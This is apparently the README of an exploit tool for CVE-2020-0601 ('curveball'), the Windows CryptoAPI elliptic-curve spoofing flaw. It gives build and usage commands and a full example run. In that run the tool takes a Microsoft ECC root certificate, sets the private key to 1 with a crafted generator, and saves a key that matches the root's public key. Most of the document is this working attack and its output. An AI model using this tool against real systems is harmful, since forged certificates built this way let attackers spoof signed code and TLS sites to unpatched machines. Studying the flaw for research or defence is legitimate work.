# curveball
CVE-2020-0601 #curveball - Alternative Key Calculator

## Build

### Windows
Visual Studio 2012 or >, then build the solution.

### Linux / Unix
`cc altkey.c -lcrypto -o altkey`

## Usage

Usage: `altkey ec_public_certificate.pem [ec_new_privatekey.pem]`

## Example

```
C:\security\curveball\Release>altkey ..\public\CACA93B9D23D2B6FA76E8B8471931E0DF3EC6F63AF3CDBB936C41954A1872326.crt myprivate.key
Certificate:
    Data:
        Serial Number:
            14:98:26:66:dc:7c:cd:8f:40:53:67:7b:b9:99:ec:85
        Issuer: C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft ECC Product Root Certificate Authority 2018
        Validity
            Not Before: Feb 27 20:42:08 2018 GMT
            Not After : Feb 27 20:50:46 2043 GMT
        Subject: C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft ECC Product Root Certificate Authority 2018
        Subject Public Key Info:
            Public Key Algorithm: id-ecPublicKey
                Public-Key: (384 bit)
                pub:
                    04:c7:11:16:2a:76:1d:56:8e:be:b9:62:65:d4:c3:
                    ce:b4:f0:c3:30:ec:8f:6d:d7:6e:39:bc:c8:49:ab:
                    ab:b8:e3:43:78:d5:81:06:5d:ef:c7:7d:9f:ce:d6:
                    b3:90:75:de:0c:b0:90:de:23:ba:c8:d1:3e:67:e0:
                    19:a9:1b:86:31:1e:5f:34:2d:ee:17:fd:15:fb:7e:
                    27:8a:32:a1:ea:c9:8f:c9:7e:18:cb:2f:3b:2c:48:
                    7a:7d:a6:f4:01:07:ac
                ASN1 OID: secp384r1
                NIST CURVE: P-384
Private-Key set to 1
Private-Key: (384 bit)
priv:
    00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:
    00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:
    00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:
    00:00:01
pub:
    04:c7:11:16:2a:76:1d:56:8e:be:b9:62:65:d4:c3:
    ce:b4:f0:c3:30:ec:8f:6d:d7:6e:39:bc:c8:49:ab:
    ab:b8:e3:43:78:d5:81:06:5d:ef:c7:7d:9f:ce:d6:
    b3:90:75:de:0c:b0:90:de:23:ba:c8:d1:3e:67:e0:
    19:a9:1b:86:31:1e:5f:34:2d:ee:17:fd:15:fb:7e:
    27:8a:32:a1:ea:c9:8f:c9:7e:18:cb:2f:3b:2c:48:
    7a:7d:a6:f4:01:07:ac
Field Type: prime-field
Prime:
    00:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:fe:ff:ff:ff:ff:00:00:00:00:00:00:00:00:
    ff:ff:ff:ff
A:
    00:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:fe:ff:ff:ff:ff:00:00:00:00:00:00:00:00:
    ff:ff:ff:fc
B:
    00:b3:31:2f:a7:e2:3e:e7:e4:98:8e:05:6b:e3:f8:
    2d:19:18:1d:9c:6e:fe:81:41:12:03:14:08:8f:50:
    13:87:5a:c6:56:39:8d:8a:2e:d1:9d:2a:85:c8:ed:
    d3:ec:2a:ef
Generator (uncompressed):
    04:c7:11:16:2a:76:1d:56:8e:be:b9:62:65:d4:c3:
    ce:b4:f0:c3:30:ec:8f:6d:d7:6e:39:bc:c8:49:ab:
    ab:b8:e3:43:78:d5:81:06:5d:ef:c7:7d:9f:ce:d6:
    b3:90:75:de:0c:b0:90:de:23:ba:c8:d1:3e:67:e0:
    19:a9:1b:86:31:1e:5f:34:2d:ee:17:fd:15:fb:7e:
    27:8a:32:a1:ea:c9:8f:c9:7e:18:cb:2f:3b:2c:48:
    7a:7d:a6:f4:01:07:ac
Order:
    00:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:c7:63:4d:81:f4:
    37:2d:df:58:1a:0d:b2:48:b0:a7:7a:ec:ec:19:6a:
    cc:c5:29:73
Cofactor:  1 (0x1)
Seed:
    a3:35:92:6a:a3:19:a2:7a:1d:00:89:6a:67:73:a4:
    82:7a:cd:ac:73
Private-Key saved to: myprivate.key
```